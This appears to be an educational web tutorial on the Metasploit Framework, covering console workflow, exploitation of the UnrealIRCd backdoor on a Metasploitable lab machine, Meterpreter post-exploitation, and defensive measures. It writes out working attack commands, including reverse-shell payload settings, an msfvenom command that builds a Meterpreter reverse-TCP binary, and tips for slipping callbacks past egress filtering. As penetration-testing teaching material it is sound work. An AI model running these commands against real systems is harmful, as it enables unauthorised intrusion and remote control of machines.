---
title: Metasploit Framework
description: "Master the Metasploit Framework for authorised pentesting: msfconsole workflow, exploits, payloads, Meterpreter post-exploitation, and blue-team defence."
layout: ../../layouts/MainLayout.astro
---

If one tool is synonymous with penetration testing, it is the Metasploit Framework. Maintained by Rapid7 as an open-source project, Metasploit bundles a huge library of exploits, payloads, and supporting modules behind a single console, so an authorised tester can move from "this service looks vulnerable" to a working proof of concept in minutes.

<figure class="hh-video">
  <video controls preload="none" playsinline poster="/en/images/metasploit-walkthrough-poster.png">
    <source src="/en/videos/metasploit-walkthrough.webm" type="video/webm" />
    <source src="/en/videos/metasploit-walkthrough.mp4" type="video/mp4" />
    Your browser does not support embedded video.
  </video>
  <figcaption>Exploiting a known-vulnerable lab service with the Metasploit Framework to land a root shell.</figcaption>
</figure>

## Set Up a Legal Lab First

Everything below assumes a target you own or have written permission to test. The safest place to learn is a deliberately vulnerable machine on an isolated virtual network. Follow the [Metasploitable VM Setup](/en/page-metasploitable) guide to build one before you run a single command.

**Responsible use:** running these techniques against systems you do not own is illegal in most jurisdictions and unethical everywhere. Metasploit is a defensive and assessment tool. Keep it on your own lab, a client engagement with a signed scope, or a sanctioned CTF range.

<figure class="hh-figure">
  <img src="/en/diagrams/reverse-vs-bind-shell.svg" alt="Bind vs. reverse shells — and why reverse shells slip past firewalls." loading="lazy" />
  <figcaption>Bind vs. reverse shells — and why reverse shells slip past firewalls.</figcaption>
</figure>

## What Metasploit Actually Is

It helps to stop thinking of Metasploit as "a hacking program" and start thinking of it as a modular toolkit. Everything you do is assembled from interchangeable modules:

- **Exploits** — code that takes advantage of a specific [vulnerability](/en/page-vulnerability) to gain access or execution.
- **Payloads** — what actually runs on the target after the exploit lands (a shell, a Meterpreter session, a single command).
- **Auxiliary** — scanners, fuzzers, sniffers, and other tools that do not deliver a payload, such as service enumeration or login brute-forcing.
- **Post** — post-exploitation modules for gathering credentials, pivoting, and enumerating a compromised host.
- **Encoders and NOPs** — helpers that reshape payload bytes, historically used to dodge simple signature matching.

Because it is open source, the community keeps the module set current with newly disclosed vulnerabilities. Metasploit is the best-known member of a broader category covered in [Exploitation Frameworks](/en/page-exploitation-frameworks).

## Installing and Launching

Kali Linux and Parrot OS ship with Metasploit pre-installed. On another Debian-based system, install it through your [Apt Package Manager](/en/page-apt-package-manager) using Rapid7's `msfinstall` script or your distribution's package.

Metasploit works best with its PostgreSQL database enabled, which lets it store hosts, services, and loot across a session. Initialise it once:

```bash
sudo msfdb init
```

Then launch the console:

```bash
msfconsole
```

After the ASCII banner you land at the prompt:

```bash
msf6 >
```

Confirm the database is connected — many workflows depend on it:

```bash
msf6 > db_status
```

While graphical front-ends exist, `msfconsole` is the primary interface and gives you the fullest access to the framework.

## The Core Workflow

Nearly every engagement follows the same loop, and the same handful of commands drive it:

| Command           | What it does                                       |
| ----------------- | -------------------------------------------------- |
| `search <term>`   | Find modules by name, CVE, or platform             |
| `use <module>`    | Select a module to work with                       |
| `info`            | Read the description, options, and references      |
| `show options`    | List settings and which are required               |
| `set NAME value`  | Configure an option (`setg` sets it globally)      |
| `check`           | Test whether a target is vulnerable without firing |
| `exploit` / `run` | Launch the module                                  |

The order that matters: reconnaissance, then module selection, then configuration, then execution, then post-exploitation.

## Walkthrough: The UnrealIRCd Backdoor

A clean first example is the [backdoor](/en/page-backdoor) that shipped in a trojaned UnrealIRCd 3.2.8.1 release, present on Metasploitable 2 and listening on port 6667. Start with reconnaissance so you are targeting a real, confirmed service rather than guessing — [Nmap](/en/page-4) is the standard choice, and Metasploit can run it directly into its database:

```bash
msf6 > db_nmap -sV -p 6667 192.168.56.101
```

With the service confirmed, select the exploit:

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
```

### Choosing a Payload

The exploit is the vehicle that gets you through the door; the payload is what you carry inside. A reverse shell tells the target to connect back to you, which usually survives outbound-only firewall rules better than a bind shell:

```bash
msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
```

### Configuring and Firing

Review what the module needs, then point it at the target (`RHOSTS`) and set your own machine as the callback address (`LHOST`):

```bash
msf6 exploit(unreal_ircd_3281_backdoor) > show options
msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1
msf6 exploit(unreal_ircd_3281_backdoor) > exploit
```

On success you are dropped into a command shell on the target. This particular backdoor runs as root, but on real engagements you will more often land as a low-privilege user and need to escalate — see [Root Access](/en/page-root-access).

## Meterpreter and Post-Exploitation

A raw shell is fragile and noisy. Meterpreter is Metasploit's advanced payload: it runs in memory, speaks an encrypted channel back to you, and exposes rich built-in commands (`sysinfo`, `getuid`, `download`, `hashdump`, `screenshot`) without spawning obvious child processes.

If you have a basic shell, background it with `Ctrl+Z`, list your sessions, and upgrade in place:

```bash
msf6 > sessions -l
msf6 > sessions -u 1
```

Once you interact with the resulting Meterpreter session, `help` lists everything available. Treat post-exploitation as evidence gathering for your report, not a free-for-all: collect only what your scope authorises.

## Building Payloads with msfvenom

Not every engagement gives you a ready-made exploit. `msfvenom` is the standalone generator for standalone payloads — useful when you have permission to deliver one through a phishing simulation, a USB drop test, or a web upload during an authorised assessment:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 -f elf -o payload.elf
```

You then catch the callback with the `exploit/multi/handler` module configured for the same payload, `LHOST`, and `LPORT`.

## Defending Against Metasploit

Understanding the offensive tool is only half the value; the point is to close the gaps it finds. From a blue-team perspective:

- **Patch and inventory.** Nearly every framework exploit targets a known, already-patched flaw. Timely patching and accurate asset inventory remove most of the module list from play.
- **Reduce exposure.** The UnrealIRCd example was reachable only because an unnecessary service faced the network. Minimise open ports and segment internal networks.
- **Detect the payload, not just the exploit.** Modern EDR and IDS/IPS flag reverse-shell behaviour, unexpected outbound connections, and in-memory injection. Encoders no longer reliably evade behaviour-based detection.
- **Log and alert.** Meterpreter's stealth is relative. Egress monitoring, DNS logging, and alerts on new listening sockets catch a lot.

## Common Mistakes That Trip People Up

Most "the exploit ran but nothing happened" moments come down to a handful of predictable errors, not a broken module.

- **Pointing LHOST at the wrong interface.** This is the number-one killer of reverse shells. `LHOST` is _your_ callback address, not the target's, and on a machine with several interfaces — a VPN, a host-only adapter, and NAT — you must pick the one the target can actually route back to. On a VirtualBox host-only network that is usually your `vboxnet0` address (e.g. `192.168.56.1`), not your public [IP](/en/page-ip). Run `ip addr` and confirm before you fire.
- **Mismatched payload and target.** A `linux/x64` payload against a 32-bit or Windows host lands nothing. Read the module's `info`, match the architecture and OS, and choose the staged or stageless variant that suits your situation.
- **msfvenom and the handler disagreeing.** The `exploit/multi/handler` you set up to catch a callback must use the _exact same_ `PAYLOAD`, `LHOST`, and `LPORT` you baked into the binary. One typo and the session never registers.
- **Fighting the firewall.** A bind payload asks you to connect _into_ the target — which an inbound-filtering [firewall](/en/page-firewall) will drop. Behind NAT, default to a reverse payload; if egress filtering blocks unusual ports, switch to a `reverse_https` payload on a commonly allowed port such as 443, which also blends into normal web traffic.
- **Skipping recon and `check`.** Firing an exploit at a service you never fingerprinted wastes time and makes noise. Confirm the version first, and run `check` when the module supports it.
- **`set` versus `setg`, and a dead database.** `RHOSTS` clears when you switch modules unless you used `setg`, and if `db_status` reports disconnected your hosts and loot silently go nowhere.

Prefer to watch the workflow end to end before trying it yourself? See the [Metasploit Video Examples](/en/page-metasploitVideoExample). Keep every session scoped, logged, and authorised.
